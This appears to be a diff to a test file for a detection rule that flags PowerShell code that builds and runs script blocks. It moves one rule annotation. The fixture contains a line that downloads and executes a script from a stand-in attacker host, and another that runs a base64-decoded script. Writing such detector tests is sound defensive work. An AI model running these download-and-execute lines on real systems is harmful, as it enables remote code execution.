@@ -4,8 +4,8 @@
 # ruleid: ps-scriptblock-create-invoke
 [ScriptBlock]::Create((New-Object Net.WebClient).DownloadString('http://evil.example.com/p.ps1')).Invoke()
 
-# ruleid: ps-scriptblock-create-invoke
 $decodedScript = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64blob))
+# ruleid: ps-scriptblock-create-invoke
 [ScriptBlock]::Create($decodedScript).Invoke()
 
 # ok: ps-scriptblock-create-invoke
